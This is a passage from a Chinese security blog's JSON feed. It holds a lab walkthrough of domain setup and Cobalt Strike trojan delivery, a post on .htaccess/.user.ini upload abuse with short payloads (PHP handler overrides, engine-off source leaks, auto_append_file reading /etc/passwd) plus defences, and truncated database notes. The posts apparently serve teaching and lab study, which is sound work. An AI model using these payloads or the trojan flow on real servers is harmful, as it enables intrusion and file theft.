            "content_html": "<p>[TOC]</p>\n<h2 id=\"内网渗透的流程概述\"><a href=\"#内网渗透的流程概述\" class=\"headerlink\" title=\"内网渗透的流程概述\"></a>内网渗透的流程概述</h2><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907123946766.png\"></p>\n<p>内网渗透攻击的是一个内网内的所有机器</p>\n<p>目的：控制内网内的所有机器</p>\n<p>前提：已经控制了内网里的一台机器</p>\n<h2 id=\"什么是工作域和组\"><a href=\"#什么是工作域和组\" class=\"headerlink\" title=\"什么是工作域和组\"></a>什么是工作域和组</h2><p>工作组:工作组是局域网中的一一个概念。它是最常见最简单最普通的资源管理模式，就是将<br>不同的电脑按功能分别列入不同的组中，以方便管理</p>\n<p>域: Windows域是计算机网络的一种形式，其中所有用户帐户，计算机，打印机和其他安全<br>主体都在位于称为域控制器的一-个或多个中央计算机集群上的中央数据库中注册。身份验证<br>在域控制器上进行。在域中使用计算机的每个人都会收到一个唯一的用户帐户， 然后可以为<br>该帐户分配对该域内资源的访问权限</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907124937328.png\"></p>\n<p>工作组的缺点：</p>\n<ul>\n<li>缺乏集中管理与控制的机制</li>\n<li>没用集中的统一账户管理</li>\n<li>只适合小规模用户的使用</li>\n</ul>\n<p>控制所有主机的媒介就是找到域控</p>\n<h2 id=\"搭建域环境\"><a href=\"#搭建域环境\" class=\"headerlink\" title=\"搭建域环境\"></a>搭建域环境</h2><p>实验环境</p>\n<ul>\n<li>域控 Windows server 2012</li>\n<li>域内主机 Windows server 2008</li>\n<li>攻击机 kali</li>\n</ul>\n<p>先登录域控服务器</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907130458478.png\"></p>\n<h3 id=\"1、设置服务器\"><a href=\"#1、设置服务器\" class=\"headerlink\" title=\"1、设置服务器\"></a>1、设置服务器</h3><p>在域控服务器中配置ip地址（注意：这里DNS要与IP地址相同，防止找不到域）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907131025908.png\"></p>\n<h3 id=\"2、更改域控服务器的主机名\"><a href=\"#2、更改域控服务器的主机名\" class=\"headerlink\" title=\"2、更改域控服务器的主机名\"></a>2、更改域控服务器的主机名</h3><p>将域控主机名改为DC（do man controller）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907134746980.png\"></p>\n<p>改完名之后等待域控服务器重启</p>\n<h3 id=\"3、安装域控制器和DNS服务\"><a href=\"#3、安装域控制器和DNS服务\" class=\"headerlink\" title=\"3、安装域控制器和DNS服务\"></a>3、安装域控制器和DNS服务</h3><p>接下来在域控服务器上面安装域控制器和DNS服务</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135517911.png\"></p>\n<p>前面的无脑下一步就行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135603793.png\"></p>\n<p>这个地方勾选基于角色功能的安装，无脑下一步</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135758204.png\"></p>\n<p>这个地方安装域控制器和DNS服务</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135857104.png\"></p>\n<p>等待安装完成</p>\n<p>在服务器管理页面点击黄旗</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140153956.png\"></p>\n<p>现在还没升级成为域控</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140250376.png\"></p>\n<p>升级</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140436007.png\"></p>\n<p>这里选择添加新林，就是给域控服务器一个名字</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140531418.png\"></p>\n<p>这里的跟域名要根据常见域名格式，接着无脑下一步</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140814473.png\"></p>\n<p>这个地方的密码随便设置就行，影响不大，用不上，一波无脑下一步</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140937411.png\"></p>\n<p>这个地方会检查服务器是否满足升级为域控的先决条件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907141053115.png\"></p>\n<p>检查通过后点击安装，经过重启后域控服务器调试完毕</p>\n<h3 id=\"4、域内主机加入域\"><a href=\"#4、域内主机加入域\" class=\"headerlink\" title=\"4、域内主机加入域\"></a>4、域内主机加入域</h3><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907142503472.png\"></p>\n<p>先查看2008的ip看是否能联网</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907142214395.png\"></p>\n<p>这里要将DNS服务器地址改为域控服务器的ip地址</p>\n<p>接下来改主机名加入域</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907142736819.png\"></p>\n<p>在跳出的弹窗中输入域控服务器的用户名和密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907143008660.png\"></p>\n<p>回车后会弹出成功加入的弹窗</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907143217220.png\"></p>\n<p>成功入狱（狗头保命）</p>\n<h2 id=\"活动目录AD的作用\"><a href=\"#活动目录AD的作用\" class=\"headerlink\" title=\"活动目录AD的作用\"></a>活动目录AD的作用</h2><p>可以理解为域控上面的数据库，在里面添加用户才能登录</p>\n<p>打开域控服务器找到Action Directory用户和计算机</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144119881.png\"></p>\n<p>这里添加一个用户</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144450484.png\"></p>\n<p>设置密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144504724.png\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144539400.png\"></p>\n<p>使用2008成功登录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907145139200.png\"></p>\n<h2 id=\"使用Cobalt-Strike远控电脑\"><a href=\"#使用Cobalt-Strike远控电脑\" class=\"headerlink\" title=\"使用Cobalt Strike远控电脑\"></a>使用Cobalt Strike远控电脑</h2><p>把cs文件导入攻击机</p>\n<p>进入目录使用命令 sudo bash teamserver 【kali的ip】 密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907153453234.png\"></p>\n<p>再开一个端口运行bash cobaltsrike .sh</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907153739520.png\"></p>\n<p>在弹窗中输入kali的ip</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907153947445.png\"></p>\n<p>成功进入cs</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154002888.png\"></p>\n<p>先开一个监听</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154214414.png\"></p>\n<p>点击add</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154343665.png\"></p>\n<p>输入对应的ip和端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154621003.png\"></p>\n<p>开始生成木马</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154714949.png\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154830575.png\"></p>\n<p>使用python3起一个web环境</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907155034157.png\"></p>\n<p>这里要关闭防火墙</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">先安装\nsudo apt-get install ufw\n\n检查防火墙的状态（默认 inactive） # ufw status\n防火墙版本 # ufw version\n启动ufw防火墙 # ufw enable\n关闭ufw防火墙 # ufw disable\n默认禁止访问所有 # ufw default deny\n开放22/TCP端口 # ufw allow 22/tcp\n开放53端口(tcp/udp) # ufw allow 53\n禁止外部访问 # ufw deny 3306\n删除已经添加过的规则 # ufw delete allow 22\n允许此IP访问所有的本机端口 # ufw allow from 192.168.1.100\n删除上面的规则 # ufw delete allow from 192.168.1.100\n查看规则，显示行号 # ufw status numbered\n删除第三条规则 # ufw delete 3\n关闭ufw # ufw disable\n禁止对8888端口的访问 # ufw deny 8888\n打开来自192.168.0.1的tcp请求的22端口 # ufw allow proto tcp from 192.168.0.1 to any port 22<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907204556037.png\" alt=\"image-20220907204556037\"></p>\n<p>将文件下载下来，然后运行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907204632334.png\" alt=\"image-20220907204632334\"></p>\n<p>攻击机上成功上线</p>\n",
            "tags": [
                "内网",
                "域环境"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/user.ini%E5%92%8Chtaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/",
            "url": "https://blog.xcu.icu/2022/10/24/user.ini%E5%92%8Chtaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/",
            "title": "user.ini和htaccess文件的利用",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"htaccess文件的利用\"><a href=\"#htaccess文件的利用\" class=\"headerlink\" title=\".htaccess文件的利用\"></a>.htaccess文件的利用</h2><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tLz90PWh0dHA6Ly9odGFjY2Vzcy51dXouY2MvI2FfV1dX\">自动生成.htaccess的网站</span></p>\n<p>分布式配置文件，它里面存放着apache服务器配置相关命令，提供了针对目录改变配置的方法，作用范围是当前目录及其子目录</p>\n<p>使用前，首先要启用htacces，将AllowOveride的配置改为all</p>\n<p><strong>AllowOverride从字面上解释是允许覆盖的意思，即Apache允许另一配置文件覆盖现有配置文件。</strong></p>\n<p>在 AllowOverride 设置为 None 时， .htaccess 文件将被完全忽略。当此指令设置为 All 时，所有具有 “.htaccess” 作用域的指令都允许出现在 .htaccess 文件中。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019211017128.png\" alt=\"image-20221019211017128\"></p>\n<h3 id=\"问题点一\"><a href=\"#问题点一\" class=\"headerlink\" title=\"问题点一\"></a>问题点一</h3><p>PHPStudy中AddType application&#x2F;x-httpd-php等Apache命令之所以在Apache的设置文件中设置后未实现目标效果是由于PHP的版本不符导致的，但注意这里的PHP版本并不是指PHP7.3.0、PHP7.4.0这种版本号，也不是适用于32位的PHP、适用于64位的PHP这种不同机型的版本，而<strong>是PHP的NTS(Non Thread Safe)与TS(Thread Safe)的这种不同版本导致的</strong>。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aW5kb3dzLnBocC5uZXQvZG93bmxvYWQv\">PHP For Windows: Binaries and sources Releases</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019230226348.png\"></p>\n<ol>\n<li><strong>ts(Thread-Safety)<strong>即</strong>线程安全</strong>，多线程访问时，采用了加锁机制，当一个线程访问该类的某个数据时，进行保护，其他线程不能进行访问直到该线程读取完，其他线程才可使用。</li>\n<li><strong>nts(None-Thread Safe)<strong>即</strong>非线程安全</strong>，就是不提供数据访问保护，有可能出现多个线程先后更改数据造成所得到的是 脏数据php以fast cgi方式运行的时候选择这个版本，具有更好的性能；</li>\n</ol>\n<h4 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h4><p>安装TS版本的php，在apache配置中设置好</p>\n<p>在php文件夹中将php.ini-development文件复制一份命名为php.ini</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019234241421.png\" alt=\"image-20221019234241421\"></p>\n<p>新下载的php本来没有现成的php.ini文件。只是给了</p>\n<p>php.ini-development （开发环境用）与 php.ini-production（生产环境用）两个建议。</p>\n<p>而php去加载php.ini作为配置文件的。我们更喜欢哪个建议，就把它备份，然后重命名为php.ini然后加入自己个性化的配置即可。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019234518254.png\" alt=\"image-20221019234518254\"></p>\n<p>打开php.ini，找到extension_dir，并把前面的”;”符号删掉(在php.ini相当于注释符)，其值改为”PHP文件的路径&#x2F;ext”。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019234918061.png\" alt=\"image-20221019234918061\"></p>\n<p>他是放php扩展的目录,保存后，我们PHP就设置完成了，接下来要设置Apache。</p>\n<p>来到PHPStudy安装Apache的目录下，打开Apache的配置文件httpd.conf,搜索LoadModule，找到有很多LoadModule语句的地方。( <strong>LoadModule：加载特定的DSO模块。</strong>)</p>\n<p>在末尾加上LoadModule php7_module “PHP文件的路径&#x2F;php7apache2_4.dll”和PHPIniDir “PHP文件的路径”。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019235835759.png\" alt=\"image-20221019235835759\"></p>\n<p> 再加上一句AddType application&#x2F;x-httpd-php .php，配置就完成了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020000146394.png\" alt=\"image-20221020000146394\"></p>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><h5 id=\"文件解析\"><a href=\"#文件解析\" class=\"headerlink\" title=\"文件解析\"></a>文件解析</h5><p>首先还是先说文件上传中常用的利用方式</p>\n<p>(8.*无法使用)</p>\n<p>在htaccess文件中写入如下内容，上传到服务端后再上传一个其他任意后缀的文件，都会被当作php文件解析</p>\n<pre class=\"line-numbers language-htaccess\" data-language=\"htaccess\"><code class=\"language-htaccess\">&lt;FilesMatch “.png”&gt;\nSetHandler application&#x2F;x-httpd-php\n&lt;&#x2F;FilesMatch&gt;\n#匹配文件中有haha存在\nSetHandler application&#x2F;x-httpd-php\n#SetHandler强制所有匹配的文件由指定处理程序处理\nAddType application&#x2F;x-httpd-php .txt\n#AddType将给定的文件扩展名映射到指定的内容类型<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020180621597.png\" alt=\"image-20221020180621597\"></p>\n<p>接着聊一聊别的利用方式</p>\n<h5 id=\"源码泄露\"><a href=\"#源码泄露\" class=\"headerlink\" title=\"源码泄露\"></a>源码泄露</h5><p>当使用 PHP 作为 Apache 模块时，也可以用 Apache 的配置文件（例如 httpd.conf）和 .htaccess 文件中的指令来修改 php 的配置设定</p>\n<p>我们可以通过 .htaccess 文件的 php_value 指令对 PHP 的 engine 配置选项进行设定，当把 engine 的值设为 off（或 0）时可以禁用一个本目录和子目录中的 PHP 解析，此时将会造成源码泄露：</p>\n<p>在htaccess文件中写入</p>\n<pre class=\"line-numbers language-htaccess\" data-language=\"htaccess\"><code class=\"language-htaccess\">php_value engine 0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020210713349.png\" alt=\"image-20221020210713349\"></p>\n<h5 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h5><p>htaccess文件中同样有两个配置auto_prepend_file和auto_append_file，我们可以通过 php_value 来设置，条件是同级目录下有php文件</p>\n<pre class=\"line-numbers language-htaccess\" data-language=\"htaccess\"><code class=\"language-htaccess\">php_value auto_append_file &#x2F;etc&#x2F;passwd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020211527232.png\" alt=\"image-20221020211527232\"></p>\n<h5 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h5><p>最直接的就是过滤htaccess后缀</p>\n<p>对文件重命名（htaccess文件命名固定）</p>\n<h2 id=\"user-ini的利用\"><a href=\"#user-ini的利用\" class=\"headerlink\" title=\"user.ini的利用\"></a>user.ini的利用</h2><p>php.ini是php的全局配置文件，只要是以fastcgi运行的php都可以用这个方法，对整个web环境起作用</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018203121751.png\" alt=\"image-20221018203121751\"></p>\n<p>user.ini是用户自定义的php.ini，如果在文件上传中没有对其进行限制，那么我们就可以修改php.ini的配置，既然是用户自定义，那么肯定要提到权限问题。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018204408073.png\" alt=\"image-20221018204408073\"></p>\n<p>官方文档提到只有在这两种模式的ini设置可以被识别，那么就不得不提到什么是PHP_INI_*模式</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018175831433.png\" alt=\"image-20221018175831433\"></p>\n<p>这些模式决定着一个 PHP 的指令在何时何地，是否能够被设定。手册中的每个指令都有其所属的模式。例如有些指令可以在 PHP 脚本中用 ini_set()来设定，而有些则只能在 php.ini 或 httpd.conf 中。(上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置)，user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022120119084.png\" alt=\"image-20221022120119084\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">PHP ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>也就是说我们想利用.user.ini需要在PHP_INI_USER模式（PHP_INI_ALL模式）中，那么哪些配置可以在 <strong>.user.ini</strong> 中设定呢？</p>\n<blockquote>\n<p>php.ini配置选项列表（<span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2luaS5saXN0LnBocA==\">http://php.net/manual/zh/ini.list.php</span> ）</p>\n</blockquote>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>.user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg，对后缀名没有太多要求），那么该文件就会被包含在要执行的php文件，相当于在php文件中中插入一句：require(.&#x2F;1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入(文件后插入如果程序以exit()结束就无法利用)。</p>\n<p>demo：</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018212902209.png\" alt=\"image-20221018212902209\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018212921996.png\" alt=\"image-20221018212921996\"></p>\n<p>经过测试php版本从5.3开始到7.4都是可用的，php8.*的没有成功</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018213744658.png\" alt=\"image-20221018213744658\"></p>\n<h3 id=\"防御-1\"><a href=\"#防御-1\" class=\"headerlink\" title=\"防御\"></a>防御</h3><p>利用条件：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">服务器脚本语言为PHP 服务器使用CGI\nFastCGI模式\n上传目录下要有可执行的php文件<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>上面提到有php8.*是不可用的，那么可使用php8.*可用从根源解决问题</p>\n<p>user.ini使用这两条条配置也有限制说了是在同目录下的其他.php 文件中包含配置中所指定的文件，也就是说需要该目录下存在.php 文件，不要将文件上传路径设置成为本目录下，存放上传文件的地方不要存有php文件（通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。但是有时可以使用 <code>../</code> 来将文件上传到其他目录，达到一个利用的效果。）严格限制文件上传的路径</p>\n<p>再者结束对ini扩展名的过滤，对文件内容auto_prepend_file、auto_append_file的过滤</p>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022150904047.png\" alt=\"image-20221022150904047\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022150917949.png\" alt=\"image-20221022150917949\"></p>\n<p>了解什么是FastCGI，首先应该知道什么是cgi</p>\n<p>全称是“通用网关接口”，是一种让客户端（web浏览器）与Web服务器（apache，nginx等）程序进行通信（数据传输）的协议。</p>\n<h5 id=\"CGI工作流程\"><a href=\"#CGI工作流程\" class=\"headerlink\" title=\"CGI工作流程\"></a>CGI工作流程</h5><ol>\n<li>每次当web server收到index.php这种类型的动态请求后，会启动对应的CGI程序-PHP的解析器；</li>\n<li>PHP解析器会解析php.ini配置文件，初始化运行环境，然后处理请求，处理完成后将数据按照CGI规定的格式返回给web server然后退出进程；</li>\n<li>最后web server再把结果返回给浏览器。</li>\n</ol>\n<p>高并发时的性能较差：<br>   CGI程序的每一次web请求都会有启动和退出过程——每次HTTP服务器遇到动态请求时都需要重新启动脚本解析器来解析php.ini，重新载入全部DLL扩展并重初始化全部数据结构，然后把结果返回给HTTP服务器</p>\n<h5 id=\"FastCGI\"><a href=\"#FastCGI\" class=\"headerlink\" title=\"FastCGI\"></a>FastCGI</h5><p>因CGI高并发时性能差，未解决这一问题产生了FastCGI</p>\n<h5 id=\"FastCGI工作流程\"><a href=\"#FastCGI工作流程\" class=\"headerlink\" title=\"FastCGI工作流程\"></a>FastCGI工作流程</h5><ol>\n<li>Web Server启动同时，加载FastCGI进程管理器</li>\n<li>FastCGI进程管理器读取php.ini配置文件，对自身进行初始化，启动多个CGI解释器进程(php-cgi)，等待来自Web Server的连接。</li>\n<li>当Web Server接收到客户端请求时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server会将相关环境变量和标准输入发送到FastCGI子进程php-cgi进行处理</li>\n<li>FastCGI子进程完成处理后将数据按照CGI规定的格式返回给Web Server，然后关闭FastCGI子进程或者等待下一次请求。</li>\n</ol>\n<h5 id=\"FastCGI解决方案\"><a href=\"#FastCGI解决方案\" class=\"headerlink\" title=\"FastCGI解决方案\"></a>FastCGI解决方案</h5><p>Master-Worker模式</p>\n<p>Fastcgi会先启一个master，解析配置文件，初始化执行环境，然后再启动多个worker。当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然提高。而且当worker不够用时，master可以根据配置预先启动几个worker等着；当然空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源。这就是fastcgi的对进程的管理。</p>\n",
            "tags": [
                "Web",
                "文件上传"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/",
            "url": "https://blog.xcu.icu/2022/10/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/",
            "title": "数据库系统概述",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<p>[TOC]</p>\n<h1 id=\"1-1数据库系统概述\"><a href=\"#1-1数据库系统概述\" class=\"headerlink\" title=\"1.1数据库系统概述\"></a>1.1数据库系统概述</h1><h2 id=\"1-1-1四个基本概念\"><a href=\"#1-1-1四个基本概念\" class=\"headerlink\" title=\"1.1.1四个基本概念\"></a>1.1.1四个基本概念</h2><h3 id=\"数据（data）（选择填空）\"><a href=\"#数据（data）（选择填空）\" class=\"headerlink\" title=\"数据（data）（选择填空）\"></a>数据（data）（选择填空）</h3><p>数据是数据库中存储的基本对象</p>\n<p>定义：数据是描述事物的符号记录</p>\n<p>数据的种类有文本，图形，图像，音频，视频，学生的档案记录，货物的运输情况</p>\n<p>数据的特点：数据与语义是密不可分的（数据的含义称为数据的语义）</p>\n<p>数据是现象，而信息反应实质</p>\n<h3 id=\"数据库（database）\"><a href=\"#数据库（database）\" class=\"headerlink\" title=\"数据库（database）\"></a>数据库（database）</h3><p>定义：数据库是长期储存在计算机内，有组织的、可共享的大量数据的集合</p>\n<p>数据库的基本特征有</p>\n<ol>\n<li>数据按照一定的数据模型组织、描述和储存</li>\n<li>可为各种用户共享</li>\n<li>冗余度较小</li>\n<li>数据独立性较高</li>\n<li>易扩展</li>\n</ol>\n<h3 id=\"数据库管理系统（DBMS）Database-Management-System\"><a href=\"#数据库管理系统（DBMS）Database-Management-System\" class=\"headerlink\" title=\"数据库管理系统（DBMS）Database Management System\"></a>数据库管理系统（DBMS）Database Management System</h3><p>定义：位于用户余操作系统之间的一程数据管理软件<br>是基础软件，一个大型复杂的软件系统</p>\n<p>作用：科学地组织和储存数据、高效的维护和获取数据</p>\n<p>主要功能：</p>\n<ol>\n<li>数据定义功能：DDL</li>\n<li>数据组织、储存和管理</li>\n<li>数据操纵功能：DML</li>\n<li>数据库的事物管理和运行管理</li>\n<li>数据库的建立运行管理</li>\n<li>数据库的建立和维护功能</li>\n</ol>\n<p>常见的DBMS</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">关系型数据库\n1. MySQL数据库\n2. Microsoft SQL Server数据库\n3. Oracle数据库\n4. Postgresql数据库\n5. Sybase数据库\n6. DB2数据库\n7. Access数据库\n非关系型数据库\n1. Mongodb数据库\n2. Redis数据库\n3. Hbase数据库\n4. Memcaced数据库<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905094000162.png\" alt=\"image-20220905094000162\"></p>\n<h3 id=\"数据库系统（DBS）\"><a href=\"#数据库系统（DBS）\" class=\"headerlink\" title=\"数据库系统（DBS）\"></a>数据库系统（DBS）</h3><p>定义：数据库系统是由数据库，数据库管理系统（及其应用开方工具）、应用程序和数据库管理员（DBA）组成的储存、管理、处理和维护数据的系统</p>\n<p>构成：</p>\n<ol>\n<li>数据库</li>\n<li>数据库管理系统（及其开发工具）</li>\n<li>应用系统</li>\n<li>数据库管理员</li>\n</ol>\n<h2 id=\"1-1-2数据库管理技术\"><a href=\"#1-1-2数据库管理技术\" class=\"headerlink\" title=\"1.1.2数据库管理技术\"></a>1.1.2数据库管理技术</h2><p>数据管理定义：对数据进行·分类、组织、编码、存储检索和维护<br>数据处理的中心问题</p>\n<p>数据管理技术的三个阶段：</p>\n<ol>\n<li>人工管理阶段</li>\n<li>文件系统阶段</li>\n<li>数据库系统阶段</li>\n</ol>\n<h2 id=\"1-1-3数据系统的特点（选择填空）\"><a href=\"#1-1-3数据系统的特点（选择填空）\" class=\"headerlink\" title=\"1.1.3数据系统的特点（选择填空）\"></a>1.1.3数据系统的特点（选择填空）</h2><h3 id=\"数据结构化\"><a href=\"#数据结构化\" class=\"headerlink\" title=\"数据结构化\"></a>数据结构化</h3><p>整体结构化：</p>\n<ul>\n<li>不在仅仅针对某一个应用，而是面向整个组织或者企业</li>\n<li>不仅数据内部结构化，整体是结构化的，数据之间具有联系</li>\n</ul>\n<p>实现数据的真正结构化</p>\n<ol>\n<li>数据的结构用数据模型描述，无需程序定义和解释</li>\n<li>数据可以变长</li>\n<li>数据的最小获取单位是数据项</li>\n</ol>\n<h3 id=\"数据的共享性高，冗余度低，易扩展\"><a href=\"#数据的共享性高，冗余度低，易扩展\" class=\"headerlink\" title=\"数据的共享性高，冗余度低，易扩展\"></a>数据的共享性高，冗余度低，易扩展</h3><p>数据库系统从整体角度看待和描述数据，数据面向整个系统，可以被多个用户多个应用共享使用</p>\n<p>数据共享的好处：</p>\n<ul>\n<li>减少数据冗余，节约储存空间</li>\n<li>避免数据之间的不相容性与不一致性</li>\n<li>使系统易于扩充</li>\n</ul>\n<h3 id=\"数据独立性高\"><a href=\"#数据独立性高\" class=\"headerlink\" title=\"数据独立性高\"></a>数据独立性高</h3><p>物理独立性：指用户的应用程序与存储在磁盘上的数据库中数据是相互独立的。当数据的物理存储改变了，应用程序不用改变。 </p>\n<p>逻辑独立性：指用户的应用程序与数据库的逻辑结构是相互独立的。数据的逻辑结构改变了，用户程序也可以不变。</p>\n<h3 id=\"数据由DBMS统一管理和控制\"><a href=\"#数据由DBMS统一管理和控制\" class=\"headerlink\" 